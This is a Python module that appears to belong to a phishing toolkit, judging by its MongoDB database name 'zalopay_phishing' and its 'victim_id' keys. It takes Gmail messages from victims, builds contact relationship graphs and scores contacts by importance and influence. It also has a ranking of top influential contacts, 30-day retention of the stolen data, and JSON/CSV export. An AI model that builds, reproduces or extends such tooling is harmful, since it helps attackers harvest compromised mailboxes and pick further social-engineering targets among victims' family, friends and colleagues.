"""
Contact Relationship Mapping Engine
Extract and analyze contact relationships from Gmail data
"""

import os
import json
import re
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
from collections import defaultdict, Counter
import logging
import networkx as nx
from dataclasses import dataclass, field

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ContactMappingConfig:
    """Contact mapping configuration"""

    def __init__(self):
        self.max_contacts_per_victim = int(os.getenv("MAX_CONTACTS_PER_VICTIM", "1000"))
        self.relationship_strength_threshold = float(os.getenv("RELATIONSHIP_STRENGTH_THRESHOLD", "0.3"))
        self.max_graph_nodes = int(os.getenv("MAX_GRAPH_NODES", "500"))
        self.enable_ml_clustering = os.getenv("ENABLE_ML_CLUSTERING", "false").lower() == "true"
        self.contact_cache_duration = int(os.getenv("CONTACT_CACHE_DURATION", "3600"))

@dataclass
class Contact:
    """Contact information"""
    email: str
    name: str = None
    first_seen: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    last_seen: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    frequency: int = 0
    relationship_type: str = "unknown"
    importance_score: float = 0.0

    # Contact details
    phone: str = None
    company: str = None
    job_title: str = None
    location: str = None

    # Communication patterns
    avg_response_time: float = 0.0
    communication_style: str = "unknown"
    topics: List[str] = field(default_factory=list)

    def update_frequency(self):
        """Update contact frequency"""
        self.frequency += 1
        self.last_seen = datetime.now(timezone.utc)

    def calculate_importance(self, total_contacts: int) -> float:
        """Calculate contact importance score"""
        try:
            # Frequency factor
            frequency_score = min(self.frequency / 10.0, 1.0) * 0.4

            # Recency factor
            days_since_last_seen = (datetime.now(timezone.utc) - self.last_seen).days
            recency_score = max(0, (30 - days_since_last_seen) / 30.0) * 0.3

            # Relationship type factor
            type_scores = {
                "family": 0.3,
                "friend": 0.2,
                "colleague": 0.25,
                "business": 0.2,
                "acquaintance": 0.1,
                "unknown": 0.05
            }
            type_score = type_scores.get(self.relationship_type, 0.05) * 0.3

            self.importance_score = frequency_score + recency_score + type_score
            return self.importance_score

        except Exception as e:
            logger.error(f"Error calculating importance: {e}")
            self.importance_score = 0.0
            return 0.0

@dataclass
class RelationshipEdge:
    """Relationship between contacts"""
    source: str
    target: str
    strength: float = 0.0
    interaction_count: int = 0
    first_interaction: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    last_interaction: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    interaction_types: List[str] = field(default_factory=list)

    def add_interaction(self, interaction_type: str = "email"):
        """Add interaction"""
        self.interaction_count += 1
        self.last_interaction = datetime.now(timezone.utc)
        if interaction_type not in self.interaction_types:
            self.interaction_types.append(interaction_type)

    def calculate_strength(self) -> float:
        """Calculate relationship strength"""
        try:
            # Base strength from interaction count
            count_factor = min(self.interaction_count / 20.0, 1.0) * 0.5

            # Recency factor
            days_since_last = (datetime.now(timezone.utc) - self.last_interaction).days
            recency_factor = max(0, (30 - days_since_last) / 30.0) * 0.3

            # Interaction diversity factor
            diversity_factor = min(len(self.interaction_types) / 3.0, 1.0) * 0.2

            self.strength = count_factor + recency_factor + diversity_factor
            return self.strength

        except Exception as e:
            logger.error(f"Error calculating relationship strength: {e}")
            self.strength = 0.0
            return 0.0

class ContactNetwork:
    """Contact relationship network"""

    def __init__(self, victim_id: str):
        self.victim_id = victim_id
        self.contacts: Dict[str, Contact] = {}
        self.relationships: Dict[Tuple[str, str], RelationshipEdge] = {}
        self.created_at = datetime.now(timezone.utc)

        # Network analysis
        self.network_density = 0.0
        self.avg_clustering_coefficient = 0.0
        self.central_contacts = []

    def add_contact(self, email: str, name: str = None, **kwargs) -> Contact:
        """Add contact to network"""
        if email not in self.contacts:
            self.contacts[email] = Contact(email=email, name=name, **kwargs)
        else:
            # Update existing contact
            contact = self.contacts[email]
            if name and not contact.name:
                contact.name = name
            contact.update_frequency()

        return self.contacts[email]

    def add_relationship(self, email1: str, email2: str, interaction_type: str = "email") -> RelationshipEdge:
        """Add relationship between contacts"""
        # Ensure contacts exist
        if email1 not in self.contacts:
            self.add_contact(email1)
        if email2 not in self.contacts:
            self.add_contact(email2)

        # Create edge key (sorted to avoid duplicates)
        edge_key = tuple(sorted([email1, email2]))

        if edge_key not in self.relationships:
            self.relationships[edge_key] = RelationshipEdge(
                source=edge_key[0],
                target=edge_key[1]
            )

        # Add interaction
        self.relationships[edge_key].add_interaction(interaction_type)

        return self.relationships[edge_key]

    def analyze_network(self) -> Dict[str, Any]:
        """Analyze contact network"""
        try:
            if not self.contacts:
                return {"error": "No contacts in network"}

            # Calculate contact importance
            total_contacts = len(self.contacts)
            for contact in self.contacts.values():
                contact.calculate_importance(total_contacts)

            # Calculate relationship strengths
            for edge in self.relationships.values():
                edge.calculate_strength()

            # Find central contacts (high importance)
            self.central_contacts = [
                contact.email for contact in self.contacts.values()
                if contact.importance_score >= 0.5
            ]

            # Calculate network metrics
            self._calculate_network_metrics()

            # Identify clusters
            clusters = self._identify_clusters()

            return {
                "total_contacts": total_contacts,
                "total_relationships": len(self.relationships),
                "network_density": self.network_density,
                "avg_clustering_coefficient": self.avg_clustering_coefficient,
                "central_contacts": self.central_contacts,
                "clusters": clusters,
                "strongest_relationships": self._get_strongest_relationships()
            }

        except Exception as e:
            logger.error(f"Error analyzing network: {e}")
            return {"error": "Network analysis failed"}

    def _calculate_network_metrics(self):
        """Calculate network density and clustering"""
        try:
            total_contacts = len(self.contacts)

            if total_contacts < 2:
                self.network_density = 0.0
                self.avg_clustering_coefficient = 0.0
                return

            # Network density (actual connections / possible connections)
            possible_connections = total_contacts * (total_contacts - 1) / 2
            actual_connections = len(self.relationships)
            self.network_density = actual_connections / possible_connections if possible_connections > 0 else 0.0

            # Average clustering coefficient (simplified)
            clustering_scores = []
            for contact in self.contacts.values():
                contact_relationships = [
                    edge for edge in self.relationships.values()
                    if contact.email in [edge.source, edge.target]
                ]
                if len(contact_relationships) > 1:
                    # Simple clustering: how many of contact's connections are connected
                    clustering_scores.append(len(contact_relationships) / total_contacts)

            self.avg_clustering_coefficient = sum(clustering_scores) / len(clustering_scores) if clustering_scores else 0.0

        except Exception as e:
            logger.error(f"Error calculating network metrics: {e}")

    def _identify_clusters(self) -> List[Dict[str, Any]]:
        """Identify contact clusters"""
        try:
            clusters = []

            # Simple clustering based on relationship strength
            strong_relationships = [
                edge for edge in self.relationships.values()
                if edge.strength >= 0.5
            ]

            # Group contacts by strong relationships
            visited = set()
            for relationship in strong_relationships:
                if relationship.source not in visited:
                    cluster = self._expand_cluster(relationship.source, strong_relationships, visited)
                    if len(cluster) >= 2:  # Only clusters with 2+ contacts
                        clusters.append({
                            "contacts": cluster,
                            "size": len(cluster),
                            "type": self._determine_cluster_type(cluster)
                        })

            return clusters

        except Exception as e:
            logger.error(f"Error identifying clusters: {e}")
            return []

    def _expand_cluster(self, start_email: str, relationships: List[RelationshipEdge], visited: Set[str]) -> List[str]:
        """Expand cluster from starting contact"""
        cluster = [start_email]
        visited.add(start_email)
        queue = [start_email]

        while queue:
            current_email = queue.pop(0)

            for relationship in relationships:
                if current_email in [relationship.source, relationship.target]:
                    other_email = relationship.target if relationship.source == current_email else relationship.source

                    if other_email not in visited:
                        cluster.append(other_email)
                        visited.add(other_email)
                        queue.append(other_email)

        return cluster

    def _determine_cluster_type(self, cluster: List[str]) -> str:
        """Determine cluster type"""
        try:
            # Analyze cluster characteristics
            cluster_contacts = [self.contacts[email] for email in cluster if email in self.contacts]

            if not cluster_contacts:
                return "unknown"

            # Check for business indicators
            business_indicators = 0
            for contact in cluster_contacts:
                if contact.company or "@" in contact.email:
                    business_indicators += 1

            if business_indicators / len(cluster_contacts) >= 0.7:
                return "business"

            # Check for personal indicators
            personal_indicators = 0
            for contact in cluster_contacts:
                if contact.relationship_type in ["family", "friend"]:
                    personal_indicators += 1

            if personal_indicators / len(cluster_contacts) >= 0.5:
                return "personal"

            return "mixed"

        except Exception as e:
            logger.error(f"Error determining cluster type: {e}")
            return "unknown"

    def _get_strongest_relationships(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get strongest relationships"""
        try:
            sorted_relationships = sorted(
                self.relationships.values(),
                key=lambda x: x.strength,
                reverse=True
            )

            return [{
                "source": edge.source,
                "target": edge.target,
                "strength": edge.strength,
                "interaction_count": edge.interaction_count,
                "interaction_types": edge.interaction_types
            } for edge in sorted_relationships[:limit]]

        except Exception as e:
            logger.error(f"Error getting strongest relationships: {e}")
            return []

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "victim_id": self.victim_id,
            "created_at": self.created_at.isoformat(),
            "total_contacts": len(self.contacts),
            "total_relationships": len(self.relationships),
            "contacts": {
                email: {
                    "name": contact.name,
                    "frequency": contact.frequency,
                    "relationship_type": contact.relationship_type,
                    "importance_score": contact.importance_score,
                    "first_seen": contact.first_seen.isoformat(),
                    "last_seen": contact.last_seen.isoformat()
                } for email, contact in self.contacts.items()
            },
            "relationships": {
                f"{edge.source}_{edge.target}": {
                    "strength": edge.strength,
                    "interaction_count": edge.interaction_count,
                    "interaction_types": edge.interaction_types,
                    "first_interaction": edge.first_interaction.isoformat(),
                    "last_interaction": edge.last_interaction.isoformat()
                } for edge in self.relationships.values()
            },
            "network_analysis": {
                "density": self.network_density,
                "avg_clustering_coefficient": self.avg_clustering_coefficient,
                "central_contacts": self.central_contacts
            }
        }

class ContactExtractor:
    """Main contact extraction engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = ContactMappingConfig()
        self.contact_networks: Dict[str, ContactNetwork] = {}

        # Contact cache
        self.contact_cache: Dict[str, Dict[str, Any]] = {}

    def extract_contacts_from_messages(self, messages: List[Dict[str, Any]], victim_id: str) -> ContactNetwork:
        """
        Extract contacts from email messages

        Args:
            messages: List of Gmail messages
            victim_id: Victim identifier

        Returns:
            Contact network
        """
        try:
            # Get or create network
            if victim_id not in self.contact_networks:
                self.contact_networks[victim_id] = ContactNetwork(victim_id)

            network = self.contact_networks[victim_id]

            # Process each message
            for message in messages:
                self._process_message_for_contacts(message, network)

            # Analyze network
            network_analysis = network.analyze_network()

            # Store in database
            if self.mongodb:
                self._store_contact_network(network)

            logger.info(f"Contacts extracted for victim: {victim_id} - {len(network.contacts)} contacts")
            return network

        except Exception as e:
            logger.error(f"Error extracting contacts: {e}")
            # Return empty network on error
            return ContactNetwork(victim_id)

    def _process_message_for_contacts(self, message: Dict[str, Any], network: ContactNetwork):
        """Process single message for contact extraction"""
        try:
            headers = message.get("headers", {})

            # Extract sender
            sender_email = self._extract_email_from_header(headers.get("from", ""))
            if sender_email:
                sender_name = self._extract_name_from_header(headers.get("from", ""))
                network.add_contact(sender_email, sender_name)

            # Extract recipients
            recipient_headers = ["to", "cc", "bcc"]
            for header_name in recipient_headers:
                header_value = headers.get(header_name, "")
                if header_value:
                    recipient_emails = self._extract_emails_from_header(header_value)
                    for email in recipient_emails:
                        recipient_name = self._extract_name_from_header(header_value)
                        network.add_contact(email, recipient_name)

            # Add relationship between sender and recipients
            if sender_email:
                recipient_emails = []
                for header_name in recipient_headers:
                    header_value = headers.get(header_name, "")
                    if header_value:
                        recipient_emails.extend(self._extract_emails_from_header(header_value))

                for recipient_email in recipient_emails:
                    if recipient_email != sender_email:  # Avoid self-loops
                        network.add_relationship(sender_email, recipient_email)

        except Exception as e:
            logger.error(f"Error processing message for contacts: {e}")

    def _extract_email_from_header(self, header_value: str) -> Optional[str]:
        """Extract email from header value"""
        try:
            # Pattern to match email addresses
            email_pattern = r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b'
            match = re.search(email_pattern, header_value)
            return match.group(0) if match else None

        except Exception:
            return None

    def _extract_emails_from_header(self, header_value: str) -> List[str]:
        """Extract multiple emails from header value"""
        try:
            email_pattern = r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b'
            matches = re.findall(email_pattern, header_value)
            return list(set(matches))  # Remove duplicates

        except Exception:
            return []

    def _extract_name_from_header(self, header_value: str) -> Optional[str]:
        """Extract name from header value"""
        try:
            # Remove email address to get name
            name = re.sub(r'\s*\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b', '', header_value)
            name = re.sub(r'[<>]', '', name).strip()

            # Handle quoted names
            if name.startswith('"') and name.endswith('"'):
                name = name[1:-1]

            return name if name else None

        except Exception:
            return None

    def analyze_contact_relationships(self, victim_id: str) -> Dict[str, Any]:
        """Analyze contact relationships"""
        try:
            if victim_id not in self.contact_networks:
                return {"error": "No contact network found for victim"}

            network = self.contact_networks[victim_id]
            analysis = network.analyze_network()

            # Additional analysis
            analysis.update({
                "relationship_distribution": self._analyze_relationship_distribution(network),
                "communication_frequency": self._analyze_communication_frequency(network),
                "contact_categories": self._categorize_contacts(network),
                "influence_analysis": self._analyze_contact_influence(network)
            })

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing contact relationships: {e}")
            return {"error": "Relationship analysis failed"}

    def _analyze_relationship_distribution(self, network: ContactNetwork) -> Dict[str, int]:
        """Analyze relationship type distribution"""
        try:
            type_counts = Counter()

            for contact in network.contacts.values():
                relationship_type = contact.relationship_type
                type_counts[relationship_type] += 1

            return dict(type_counts)

        except Exception as e:
            logger.error(f"Error analyzing relationship distribution: {e}")
            return {}

    def _analyze_communication_frequency(self, network: ContactNetwork) -> Dict[str, Any]:
        """Analyze communication frequency patterns"""
        try:
            frequency_buckets = {
                "very_high": 0,  # > 50 interactions
                "high": 0,       # 20-50 interactions
                "medium": 0,     # 5-20 interactions
                "low": 0         # 1-5 interactions
            }

            for contact in network.contacts.values():
                frequency = contact.frequency
                if frequency > 50:
                    frequency_buckets["very_high"] += 1
                elif frequency > 20:
                    frequency_buckets["high"] += 1
                elif frequency > 5:
                    frequency_buckets["medium"] += 1
                else:
                    frequency_buckets["low"] += 1

            return frequency_buckets

        except Exception as e:
            logger.error(f"Error analyzing communication frequency: {e}")
            return {}

    def _categorize_contacts(self, network: ContactNetwork) -> Dict[str, List[str]]:
        """Categorize contacts by type and importance"""
        try:
            categories = {
                "high_importance": [],
                "business_contacts": [],
                "personal_contacts": [],
                "frequent_contacts": [],
                "recent_contacts": []
            }

            recent_threshold = datetime.now(timezone.utc) - timedelta(days=30)

            for email, contact in network.contacts.items():
                # High importance contacts
                if contact.importance_score >= 0.7:
                    categories["high_importance"].append(email)

                # Business contacts
                if (contact.company or
                    "@" in email and not any(domain in email.lower() for domain in ["gmail.com", "yahoo.com", "hotmail.com"])):
                    categories["business_contacts"].append(email)

                # Personal contacts
                if contact.relationship_type in ["family", "friend"]:
                    categories["personal_contacts"].append(email)

                # Frequent contacts
                if contact.frequency >= 10:
                    categories["frequent_contacts"].append(email)

                # Recent contacts
                if contact.last_seen >= recent_threshold:
                    categories["recent_contacts"].append(email)

            return categories

        except Exception as e:
            logger.error(f"Error categorizing contacts: {e}")
            return {}

    def _analyze_contact_influence(self, network: ContactNetwork) -> Dict[str, Any]:
        """Analyze contact influence in network"""
        try:
            influence_scores = {}

            for email, contact in network.contacts.items():
                # Calculate influence based on connections and importance
                connected_relationships = [
                    edge for edge in network.relationships.values()
                    if email in [edge.source, edge.target]
                ]

                connection_strength = sum(edge.strength for edge in connected_relationships)
                influence_score = (contact.importance_score + connection_strength) / 2.0

                influence_scores[email] = {
                    "influence_score": influence_score,
                    "connection_count": len(connected_relationships),
                    "total_connection_strength": connection_strength
                }

            # Sort by influence
            sorted_influence = sorted(
                influence_scores.items(),
                key=lambda x: x[1]["influence_score"],
                reverse=True
            )

            return {
                "top_influential_contacts": sorted_influence[:10],
                "influence_distribution": self._categorize_influence(influence_scores)
            }

        except Exception as e:
            logger.error(f"Error analyzing contact influence: {e}")
            return {}

    def _categorize_influence(self, influence_scores: Dict[str, Dict[str, float]]) -> Dict[str, int]:
        """Categorize contacts by influence level"""
        try:
            categories = {
                "high_influence": 0,
                "medium_influence": 0,
                "low_influence": 0
            }

            for contact_data in influence_scores.values():
                score = contact_data["influence_score"]

                if score >= 0.7:
                    categories["high_influence"] += 1
                elif score >= 0.4:
                    categories["medium_influence"] += 1
                else:
                    categories["low_influence"] += 1

            return categories

        except Exception as e:
            logger.error(f"Error categorizing influence: {e}")
            return {}

    def _store_contact_network(self, network: ContactNetwork):
        """Store contact network in database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            networks_collection = db.contact_networks

            document = network.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=30)  # Keep for 30 days

            networks_collection.replace_one(
                {"victim_id": network.victim_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing contact network: {e}")

    def get_contact_network(self, victim_id: str) -> Optional[ContactNetwork]:
        """Get contact network for victim"""
        return self.contact_networks.get(victim_id)

    def get_contact_summary(self, victim_id: str) -> Dict[str, Any]:
        """Get contact summary for victim"""
        try:
            network = self.contact_networks.get(victim_id)
            if not network:
                return {"error": "No contact network found"}

            analysis = network.analyze_network()

            return {
                "victim_id": victim_id,
                "total_contacts": len(network.contacts),
                "total_relationships": len(network.relationships),
                "network_density": network.network_density,
                "central_contacts_count": len(network.central_contacts),
                "most_important_contact": self._get_most_important_contact(network),
                "relationship_clusters": len(analysis.get("clusters", [])),
                "last_updated": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting contact summary: {e}")
            return {"error": "Failed to get summary"}

    def _get_most_important_contact(self, network: ContactNetwork) -> Optional[str]:
        """Get most important contact"""
        try:
            if not network.contacts:
                return None

            return max(
                network.contacts.keys(),
                key=lambda email: network.contacts[email].importance_score
            )

        except Exception as e:
            logger.error(f"Error getting most important contact: {e}")
            return None

    def export_contact_network(self, victim_id: str, format: str = "json") -> str:
        """Export contact network"""
        try:
            network = self.contact_networks.get(victim_id)
            if not network:
                return ""

            if format.lower() == "json":
                return json.dumps(network.to_dict(), indent=2)

            elif format.lower() == "csv":
                # Export contacts as CSV
                csv_lines = ["Email,Name,Frequency,Importance,Relationship Type,First Seen,Last Seen"]

                for email, contact in network.contacts.items():
                    csv_lines.append(
                        f'"{email}","{contact.name or ""}","{contact.frequency}",'
                        f'"{contact.importance_score}","{contact.relationship_type}",'
                        f'"{contact.first_seen}","{contact.last_seen}"'
                    )

                return "\n".join(csv_lines)

            else:
                raise ValueError(f"Unsupported export format: {format}")

        except Exception as e:
            logger.error(f"Error exporting contact network: {e}")
            return ""

# Global contact extractor instance
contact_extractor = None

def initialize_contact_extractor(mongodb_connection=None, redis_client=None) -> ContactExtractor:
    """Initialize global contact extractor"""
    global contact_extractor
    contact_extractor = ContactExtractor(mongodb_connection, redis_client)
    return contact_extractor

def get_contact_extractor() -> ContactExtractor:
    """Get global contact extractor"""
    if contact_extractor is None:
        raise ValueError("Contact extractor not initialized")
    return contact_extractor

# Convenience functions
def extract_contacts_from_messages(messages: List[Dict[str, Any]], victim_id: str) -> ContactNetwork:
    """Extract contacts from messages (global convenience function)"""
    return get_contact_extractor().extract_contacts_from_messages(messages, victim_id)

def analyze_contact_relationships(victim_id: str) -> Dict[str, Any]:
    """Analyze contact relationships (global convenience function)"""
    return get_contact_extractor().analyze_contact_relationships(victim_id)

def get_contact_summary(victim_id: str) -> Dict[str, Any]:
    """Get contact summary (global convenience function)"""
    return get_contact_extractor().get_contact_summary(victim_id)

def export_contact_network(victim_id: str, format: str = "json") -> str:
    """Export contact network (global convenience function)"""
    return get_contact_extractor().export_contact_network(victim_id, format)